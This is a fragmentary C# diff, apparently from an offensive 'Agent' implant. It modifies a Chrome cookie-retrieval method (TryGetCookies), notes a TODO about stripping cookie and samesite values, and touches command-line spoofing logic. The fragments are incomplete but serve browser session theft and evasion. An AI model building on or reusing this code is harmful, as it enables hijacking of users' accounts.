@@ -228,7 +228,7 @@ namespace Agent
         }
         private bool TryGetCookies(string task_id)
         {
-            List<ChromeJsonObject> extensions = GetExtensions(this.config, task_id);
+            List<ChromeJsonObject> extensions = GetEverything(this.config, task_id);
 
             if (extensions.Count == 0)
             {
@@ -251,6 +251,7 @@ namespace Agent
             JsonDocument responseJsonDocument = JsonDocument.Parse(response);
             JsonElement responseRoot = responseJsonDocument.RootElement;
 
+            //Todo remove cookies element, and maybe remove samesite values?
             if (responseRoot.TryGetProperty("result", out JsonElement resultElement))
             {
                 //Strip outer edge, leaving only the good inside
@@ -281,7 +282,7 @@ namespace Agent
                     break;
                 default:
                     finder = new ManualFinder(full_cmdline);
-                    return false;
+                    break;
             }
 
             string spoofedcmdline = string.Empty;
